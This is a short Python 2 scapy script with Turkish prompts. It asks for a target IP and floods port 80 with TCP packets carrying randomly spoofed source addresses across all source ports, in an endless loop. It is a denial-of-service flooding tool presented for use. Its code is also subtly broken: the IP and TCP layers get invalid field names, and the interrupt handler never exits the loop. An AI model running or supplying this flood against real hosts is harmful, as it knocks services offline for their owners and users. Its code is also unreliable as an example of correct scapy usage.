from scapy.all import *
import random

def genIP():
   oct1 = str(random.randint(1,254))
   oct2 = str(random.randint(1,254))
   oct3 = str(random.randint(1,254))
   oct4 = str(random.randint(1,254))

   return oct1 + '.' + oct2 + '.' + oct3 + '.' + oct4

dstIP = raw_input("Hedef IP: ")

packetNum = 1

while True:
   try:
      srcIP = genIP()
      for srcPort in range(1, 65535):
         IP1 = IP(source_IP=srcIP, destination=dstIP)
         TCP1 = TCP(srcport=srcPort, dstport=80)
         pkt = IP1 / TCP1
         send(pkt, inter=0.001)

         print "packet ", packetNum, " gönderildi."
         packetNum = packetNum + 1
   except KeyboardInterrupt:
      print "Program kapatiliyor."
